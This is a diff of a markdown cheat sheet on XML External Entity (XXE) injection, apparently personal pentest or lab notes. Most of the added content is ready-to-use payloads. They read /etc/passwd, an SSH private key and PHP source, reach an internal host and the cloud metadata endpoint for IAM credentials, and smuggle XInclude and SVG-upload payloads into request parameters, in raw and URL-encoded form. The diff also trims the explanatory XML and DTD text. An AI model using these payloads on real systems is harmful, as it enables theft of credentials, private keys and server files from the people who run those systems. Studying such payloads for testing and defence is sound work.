@@ -1,5 +1,4 @@
-`XML External Entity (XXE) Injection` vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.
-
+# XML External Entity (XXE) Injection
 ## Payloads
 ```windows
 <?xml version="1.0" encoding="UTF-8"?>
@@ -12,12 +11,7 @@
 ```
 
 ```
-<!DOCTYPE test [ 
-    <!ENTITY xxe SYSTEM "file:///c:/Users/daniel/.ssh/id_rsa"> 
-]>
-```
-
-```linux
+#Linux
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "file:///etc/passwd">
@@ -28,22 +22,40 @@
 ```
 
 ```
-<!DOCTYPE email [
-  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
-]>
+<!DOCTYPE test [<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/Users/daniel/.ssh/id_rsa">]>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/">]>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
 ```
-## XML
-`Extensible Markup Language (XML)` is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications.
+
+```bash
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+	<xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+# url encoded
+productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
+
+# XXE attacks via file upload
+Content-Disposition: form-data; name="avatar"; filename="svg_logo.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+<text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+# XXE attacks via modified content type
+Content-Type: application/x-www-form-urlencoded -> text/xml
+```
 ## XML DTD
-`XML Document Type Definition (DTD)` allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD for the XML document we saw earlier:
+`Extensible Markup Language(XML)` - `Document Type Definition (DTD)` allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD for the XML document we saw earlier:
 ```
 <!DOCTYPE email [
-  <!ELEMENT email (date, time, sender, recipients, body)>
+  <!ELEMENT email (date, recipients, body)>
   <!ELEMENT recipients (to, cc?)>
   <!ELEMENT cc (to*)>
   <!ELEMENT date (#PCDATA)>
-  <!ELEMENT time (#PCDATA)>
-  <!ELEMENT sender (#PCDATA)>
   <!ELEMENT to  (#PCDATA)>
   <!ELEMENT body (#PCDATA)>
 ]>
